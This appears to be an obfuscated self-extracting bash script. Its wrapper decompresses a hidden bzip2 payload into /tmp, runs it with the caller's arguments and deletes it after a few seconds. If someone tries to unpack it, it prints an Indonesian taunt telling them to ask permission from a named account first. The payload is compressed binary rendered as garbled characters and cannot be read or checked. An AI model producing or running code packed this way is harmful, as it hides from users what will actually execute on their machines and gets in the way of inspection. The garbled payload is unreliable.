#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYS"�g  V�A�@ ���������   @t��Ͳ��I�����Q��P@4m#@	(� ��$ɦhh �h� ���8ɓF!���`��i�D�i�jl�ȃ54i��h�4z�=B�5��5�x��6P��D��A}��s��*
���_>[`���Lv@���b�H�$9���
����"���
��v��5�r������'C���/�de�d�X���:β��,t[��z��=_�U���ФJ�4��;oyV�mF�K}��EZ�h�E*�;���Q������\H���/qzTkJ�@��9}&��7��Y,2�& *.�F&�*��)��xM���qyn�f��F�"���������^Ϋ4�xw��<ܮ�g���tx�[�2�/T�#��*�ؓ3N�r�AQ�Z�f���T���,ϝ��LUoG��(B�Y@�Dd�)�YL��J]\����Q��CE��<��l�pe�QH���(m�jFJFa�mMvz,��2�������!+bZT����͘���+D�	B1P��ċ�+|�S-�х8�A$	�h�GB�n8��Bq�J��)vw'c��!`ʚ�Uƈ`µE�ZȔT�Y�v1��46"���\T�q�9;�v+�#�fG����p��w$S�	2/vp